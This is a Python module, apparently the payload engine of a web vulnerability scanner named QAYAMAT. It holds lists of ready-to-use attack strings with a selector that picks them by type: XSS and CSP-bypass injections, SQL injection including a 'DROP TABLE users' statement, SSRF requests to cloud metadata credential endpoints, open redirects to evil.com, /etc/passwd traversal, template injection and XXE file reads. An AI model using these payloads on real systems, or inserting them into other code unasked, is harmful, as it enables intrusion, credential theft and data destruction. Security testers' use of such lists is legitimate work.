"""QAYAMAT — Payload Engine
Generates vulnerability-specific test payloads, context-aware.
"""

from typing import List, Optional, Dict, Any


class PayloadEngine:
    """Central payload store for all vulnerability types."""

    # ── XSS ──────────────────────────────────────────────────────────────────
    XSS_BASE = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'\"><svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "'-alert(1)-'",
    ]
    XSS_CSP_BYPASS = [
        "<script src='data:;base64,YWxlcnQoMSk='></script>",
        "<link rel=import href=data:text/html,<script>alert(1)</script>>",
        "<base href=//evil.com>",
    ]
    XSS_ANGULAR = [
        "{{constructor.constructor('alert(1)')()}}",
        "{{7*7}}",
    ]

    # ── SQLi ─────────────────────────────────────────────────────────────────
    SQLI_BASE = [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "'; DROP TABLE users--",
        "1 UNION SELECT NULL--",
        "' AND SLEEP(5)--",
        "' WAITFOR DELAY '0:0:5'--",
        "1' ORDER BY 1--",
    ]
    SQLI_BLIND = [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SUBSTRING(@@version,1,1)='5'--",
    ]

    # ── SSRF ─────────────────────────────────────────────────────────────────
    SSRF_BASE = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://localhost:6379/",
        "http://127.0.0.1:2375/",
        "http://[::1]/",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_PING",
    ]

    # ── Open Redirect ─────────────────────────────────────────────────────────
    OPEN_REDIRECT = [
        "//evil.com",
        "https://evil.com",
        "//evil.com/%2f..",
        "/\\evil.com",
        "https:evil.com",
        "%2F%2Fevil.com",
        "/@evil.com",
    ]

    # ── Path Traversal ───────────────────────────────────────────────────────
    PATH_TRAVERSAL = [
        "../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//etc/passwd",
        "%252e%252e%252f%252e%252e%252fetc/passwd",
    ]

    # ── SSTI ─────────────────────────────────────────────────────────────────
    SSTI = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
    ]

    # ── XXE ──────────────────────────────────────────────────────────────────
    XXE = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    ]

    def generate(self, vuln_type: str, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Return payloads for the given vulnerability type, optionally tailored by context."""
        vt = vuln_type.lower()
        ctx = context or {}

        if vt in ("xss", "cross-site scripting"):
            return self._xss_payloads(ctx)
        elif vt in ("sqli", "sql injection", "sql_injection"):
            return self._sqli_payloads(ctx)
        elif vt in ("ssrf", "server-side request forgery"):
            return self.SSRF_BASE[:]
        elif vt in ("open_redirect", "redirect"):
            return self.OPEN_REDIRECT[:]
        elif vt in ("path_traversal", "lfi", "directory traversal"):
            return self.PATH_TRAVERSAL[:]
        elif vt in ("ssti", "template injection"):
            return self.SSTI[:]
        elif vt in ("xxe", "xml external entity"):
            return self.XXE[:]
        else:
            return []

    def _xss_payloads(self, context: Dict[str, Any]) -> List[str]:
        if context.get("csp"):
            return self.XSS_CSP_BYPASS + self.XSS_BASE[:3]
        if context.get("framework") == "angular":
            return self.XSS_ANGULAR + self.XSS_BASE[:2]
        return self.XSS_BASE[:]

    def _sqli_payloads(self, context: Dict[str, Any]) -> List[str]:
        if context.get("blind"):
            return self.SQLI_BLIND + self.SQLI_BASE[:3]
        dbms = context.get("dbms", "").lower()
        if dbms == "mssql":
            return [p for p in self.SQLI_BASE if "WAITFOR" in p or "UNION" in p or "OR" in p]
        return self.SQLI_BASE[:]
